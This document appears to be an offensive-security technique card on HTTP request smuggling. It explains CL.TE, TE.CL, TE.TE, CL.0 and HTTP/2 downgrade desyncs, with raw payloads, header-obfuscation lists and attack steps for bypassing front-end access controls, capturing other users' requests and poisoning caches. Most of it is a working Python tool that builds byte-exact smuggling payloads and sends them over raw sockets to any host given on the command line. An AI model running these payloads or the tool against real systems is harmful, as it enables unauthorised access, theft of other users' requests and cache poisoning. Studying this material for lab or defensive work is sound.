---
title: "HTTP Request Smuggling - CL.TE, TE.CL, TE.TE, H2.CL/TE and Pseudo-Header CRLF"
category: web
subcategory: smuggling
type: technique
tags: [http-request-smuggling, desync, cl-te, te-cl, te-te, h2-cl, h2-te, cl-0, transfer-encoding, content-length, http2-downgrade, crlf, pseudo-header, cache-poisoning, burp, smuggler, h2csmuggler]
difficulty: hard
summary: "Front-end and back-end disagree on request length over a shared keep-alive connection; a smuggled prefix poisons the next request to bypass auth, capture requests, or poison the cache."
when_to_use:
  - "A CDN/reverse-proxy fronts an origin (Cloudflare, Akamai, nginx, HAProxy + backend)"
  - "You need to reach an internal path (/admin) blocked at the front-end"
  - "HTTP/2 is offered and downgraded to HTTP/1.1 upstream (H2.CL / H2.TE)"
  - "A timing probe shows the next request hanging (classic desync signal)"
tools: [burp, smuggler, h2csmuggler, python3]
related: [cache-poisoning-deception, race-conditions, node-parameter-pollution, race-xsleaks]
---

## TL;DR

Two servers on one keep-alive connection disagree about where a request ends. You send one
request that the front-end sees as complete but the back-end sees as having a leftover prefix;
that prefix is glued to the *next* victim request. Result: bypass front-end auth, capture
another user's request, or poison the shared cache.

## Recognise it

- A front-end proxy/CDN plus a back-end origin (the classic two-server stack).
- `Transfer-Encoding` and `Content-Length` both accepted, or HTTP/2 offered then downgraded.
- Timing probe: a crafted request makes the *next* request on the connection hang ~ your
  timeout -- the smoking gun for CL.TE / TE.CL.
- Burp "HTTP Request Smuggler" flags a desync; `smuggler.py` reports a technique.

## Theory

### Why it happens

HTTP/1.1 keep-alive reuses a TCP connection for many requests. Both ends must agree where each
request ends. Two length mechanisms exist:

- `Content-Length: N` -- read N body bytes.
- `Transfer-Encoding: chunked` -- read hex-size-prefixed chunks until a `0\r\n\r\n` terminator.

The spec says `Transfer-Encoding` wins when both are present, but implementations disagree or can
be tricked. If the front-end uses one and the back-end the other, bytes you place after the
"end" (per the front-end) become the start of the next request (per the back-end).

### The variants

**CL.TE** -- front-end uses Content-Length, back-end uses Transfer-Encoding:

```
POST / HTTP/1.1
Host: x
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Front-end reads 6 bytes (`0\r\n\r\nG`) and forwards all of it. Back-end sees chunked, reads the
`0\r\n\r\n` terminator, stops -- leaving `G` as the prefix of the next request.

**TE.CL** -- front-end chunked, back-end Content-Length:

```
POST / HTTP/1.1
Host: x
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
...
0

```

Front-end reads the chunk; back-end reads only `Content-Length: 4` bytes (`5c\r\n`) and treats
the rest as a new request. (Send the trailing `0\r\n\r\n` so the front-end is satisfied.)

**TE.TE** -- both use Transfer-Encoding, but one is tricked into ignoring it by an obfuscated
header, degrading to CL.TE or TE.CL. Obfuscations to try:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding:\tchunked          (tab)
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
Transfer-Encoding\r\n : chunked      (folded)
X: X\nTransfer-Encoding: chunked     (bare-LF smuggled header)
Transfer-Encoding: chunked, identity
 Transfer-Encoding: chunked          (leading space on the header line)
```

**CL.0** -- the back-end ignores Content-Length on certain endpoints (e.g. a static file or a
redirect), treating the body as a new request. Front-end honours CL.

**H2.CL / H2.TE** -- the front-end speaks HTTP/2 (which has an implicit, exact length) but
downgrades to HTTP/1.1 to the back-end. If you *inject* a `Content-Length` or
`Transfer-Encoding` into an HTTP/2 request, the rewritten HTTP/1.1 request desyncs the back-end.
HTTP/2 has no message-length ambiguity itself, so the bug is entirely in the downgrade.

**CRLF in HTTP/2 pseudo-headers** -- HTTP/2 carries headers in a binary format, so a `\r\n`
inside a header *value* or a pseudo-header (`:path`, `:authority`, `:method`) is not a
terminator in H2 -- but when the front-end downgrades to HTTP/1.1 text, that `\r\n` becomes a
real line break, injecting headers or a whole smuggled request:

```
:path = /x HTTP/1.1\r\nHost: x\r\nContent-Length: 0\r\n\r\nGET /admin ...
:authority = x\r\nEvil: header
```

This is "HTTP/2 request splitting" / "request tunnelling".

### Detection: the timing technique

For **CL.TE**, send a request whose *back-end* view is incomplete:

```
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

Front-end (CL=4) forwards `1\r\nA\r\n`... back-end (chunked) reads chunk `A`, then waits for the
next chunk that never arrives -> the connection hangs until timeout. A ~10s delay on the
*follow-up* request confirms CL.TE (and the reverse construction confirms TE.CL). Use a
non-idempotent method carefully; a hang is the signal.

## Attack

1. Fingerprint the stack (front-end/back-end) and confirm keep-alive reuse.
2. Timing-probe CL.TE and TE.CL; if HTTP/2 is offered, test H2.CL/H2.TE and pseudo-header CRLF.
3. Once a technique works, choose an impact:
   - **Bypass front-end auth/ACL**: smuggle `GET /admin` so the back-end serves it though the
     front-end never authorised it.
   - **Capture a victim's request**: smuggle a `POST /comment` with a `Content-Length` larger
     than your body, so the next user's request bytes are appended to your comment and stored.
   - **Reflected -> stored / header injection**: smuggle a request with an attacker `Host` or
     `X-Forwarded-For` that gets reflected/logged/cached.
   - **Cache poisoning**: smuggle a request whose response the cache stores for a normal URL
     (see `cache-poisoning-deception`).
4. Prove it (served admin content, captured request, poisoned cache entry).

## Code

```python
#!/usr/bin/env python3
"""Byte-exact request-smuggling payload builder + raw-socket sender.

Builders emit the exact bytes (explicit CRLF, correct Content-Length and chunk
sizes). send_probe() uses raw sockets/ssl and times the response. The __main__
self-test verifies the byte layout of CL.TE, TE.CL and CL.0 payloads offline.
"""
from __future__ import annotations

import socket
import ssl
import sys
import time

CRLF = "\r\n"


def _req(lines: list[str], body: str) -> bytes:
    return (CRLF.join(lines) + CRLF + CRLF + body).encode()


def cl_te(host: str, path: str = "/", smuggled: str = "G") -> bytes:
    """Front-end CL, back-end TE. CL counts the '0\\r\\n\\r\\n' + smuggled prefix."""
    body = "0" + CRLF + CRLF + smuggled
    lines = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "Content-Length: %d" % len(body),
        "Transfer-Encoding: chunked",
    ]
    return _req(lines, body)


def te_cl(host: str, path: str = "/", smuggled_request: str | None = None) -> bytes:
    """Front-end TE, back-end CL. Back-end reads only Content-Length bytes."""
    if smuggled_request is None:
        smuggled_request = "GET /admin HTTP/1.1" + CRLF + "X: "
    # chunk data = the smuggled request; chunk-size line is its hex length
    chunk = smuggled_request
    body = "%x%s%s%s0%s%s" % (len(chunk), CRLF, chunk, CRLF, CRLF, CRLF)
    lines = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "Content-Length: 4",              # back-end reads just the size line
        "Transfer-Encoding: chunked",
    ]
    return _req(lines, body)


def cl_0(host: str, path: str, smuggled_request: str) -> bytes:
    """Back-end ignores CL on `path` (static/redirect); body becomes a request."""
    lines = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "Content-Length: %d" % len(smuggled_request),
        "Connection: keep-alive",
    ]
    return _req(lines, smuggled_request)


def te_te_obfuscations() -> list[str]:
    """Header lines that trick one end into ignoring Transfer-Encoding."""
    return [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked, identity",
        "X: X\nTransfer-Encoding: chunked",
    ]


def timing_probe_cl_te(host: str, path: str = "/") -> bytes:
    """A CL.TE probe whose back-end view is incomplete -> the next req hangs."""
    body = "1" + CRLF + "A" + CRLF + "X"
    lines = [
        "POST %s HTTP/1.1" % path,
        "Host: %s" % host,
        "Content-Length: 4",
        "Transfer-Encoding: chunked",
    ]
    return _req(lines, body)


def send_probe(host: str, port: int, payload: bytes, tls: bool = True,
               timeout: float = 12.0) -> tuple[float, bytes]:
    """Send raw bytes over one connection, time the response."""
    raw = socket.create_connection((host, port), timeout=timeout)
    sock = (ssl.create_default_context().wrap_socket(raw, server_hostname=host)
            if tls else raw)
    start = time.time()
    try:
        sock.sendall(payload)
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(data) > 1 << 20:
                break
    except socket.timeout:
        return time.time() - start, b"TIMEOUT"
    finally:
        sock.close()
    return time.time() - start, data


def _self_test() -> None:
    # CL.TE: Content-Length must equal len(body) and body must end with 'G'
    p = cl_te("victim.example", smuggled="G")
    head, _, body = p.partition(b"\r\n\r\n")
    assert b"Transfer-Encoding: chunked" in head
    cl = int([l.split(b": ")[1] for l in head.split(b"\r\n")
              if l.lower().startswith(b"content-length")][0])
    assert cl == len(body), (cl, len(body))
    assert body == b"0\r\n\r\nG", body        # chunk terminator + prefix
    assert body.endswith(b"G")

    # TE.CL: chunk-size line is the hex length of the smuggled request
    smug = "GET /admin HTTP/1.1\r\nX: "
    q = te_cl("victim.example", smuggled_request=smug)
    _, _, qbody = q.partition(b"\r\n\r\n")
    size_line = qbody.split(b"\r\n")[0]
    assert int(size_line, 16) == len(smug), (size_line, len(smug))
    assert qbody.rstrip().endswith(b"0")      # terminated for the front-end
    assert b"Content-Length: 4" in q

    # CL.0: Content-Length equals the smuggled request length
    r = cl_0("victim.example", "/static.js", "GET /admin HTTP/1.1\r\n\r\n")
    rhead, _, rbody = r.partition(b"\r\n\r\n")
    rcl = int([l.split(b": ")[1] for l in rhead.split(b"\r\n")
               if l.lower().startswith(b"content-length")][0])
    assert rcl == len(rbody), (rcl, len(rbody))
    assert rbody.startswith(b"GET /admin")

    # timing probe: back-end (chunked) view is incomplete
    t = timing_probe_cl_te("victim.example")
    _, _, tbody = t.partition(b"\r\n\r\n")
    assert b"Content-Length: 4" in t
    assert tbody.startswith(b"1\r\nA\r\nX")    # a lone chunk with no terminator

    # obfuscation list is present and includes the classics
    obf = te_te_obfuscations()
    assert any("xchunked" in o for o in obf)
    assert any(o.startswith(" Transfer") for o in obf)
    assert len(obf) >= 7

    # every payload uses CRLF line endings, never bare LF in the header block
    for payload in (p, q, r, t):
        header_block = payload.split(b"\r\n\r\n")[0]
        assert b"\n" in payload
        # header lines are CRLF-separated
        assert header_block.count(b"\r\n") >= 3

    print("[ok] CL.TE, TE.CL, CL.0, timing probe byte layouts verified; "
          "%d TE.TE obfuscations" % len(obf))


def main() -> int:
    if len(sys.argv) < 3:
        print("usage: %s <host> <port> [clte|tecl|cl0|probe]" % sys.argv[0])
        return 1
    host, port = sys.argv[1], int(sys.argv[2])
    which = sys.argv[3] if len(sys.argv) > 3 else "probe"
    builder = {"clte": cl_te, "tecl": te_cl, "probe": timing_probe_cl_te}.get(which)
    payload = builder(host) if builder else cl_0(host, "/", "GET /admin HTTP/1.1\r\n\r\n")
    dt, resp = send_probe(host, port, payload)
    print("elapsed %.2fs, %d bytes" % (dt, len(resp)))
    print(resp[:300].decode("utf-8", "replace"))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **Burp's Repeater disables keep-alive by default** and normalises headers; use the "HTTP
  Request Smuggler" extension or raw sockets so your exact bytes reach the wire.
- **HTTP/2 must be tested with an HTTP/2-aware tool** -- you cannot express H2.CL/H2.TE or
  pseudo-header CRLF over HTTP/1.1. Burp does this natively; disable HTTP/2 normalisation.
- **Content-Length must be byte-exact**; an off-by-one desyncs the wrong way and hangs *your*
  connection instead of poisoning the next.
- **Chunk sizes are hex**, and each chunk and the terminator need trailing CRLF -- the builder
  handles this; hand-editing breaks it constantly.
- **Bare-LF smuggling** (`\n` without `\r`) exploits parsers that accept LF as a line end; some
  servers only desync via bare LF.
- **Idempotency**: a smuggled request can hit real users; on a live target this is disruptive
  and can capture PII -- scope it to a lab/CTF or a controlled account.
- **Connection stickiness**: the victim request must land on the *same* back-end connection;
  CDNs pool connections, so you may need to repeat to win the pairing.
- **CL.0 targets** are usually endpoints that ignore the body (GET-only handlers, redirects,
  static files) -- enumerate those first.
- **Detection false negatives**: a single timing test can be noisy; repeat and compare against a
  control request.

## Tools

- Burp "HTTP Request Smuggler" (Albinowax) -- detection + exploitation, HTTP/2 aware.
- `smuggler.py` (defparam) -- CL.TE/TE.CL/TE.TE technique scanner.
- `h2csmuggler` -- HTTP/2 cleartext upgrade smuggling.
- The raw-socket builder above for byte-exact HTTP/1.1 probes.

## References

- James Kettle -- "HTTP Desync Attacks: Request Smuggling Reborn" and "HTTP/2: The Sequel is Always Worse".
- PortSwigger Web Security Academy -- Request smuggling labs.
- RFC 7230 / RFC 9112 -- message length, Transfer-Encoding vs Content-Length precedence.
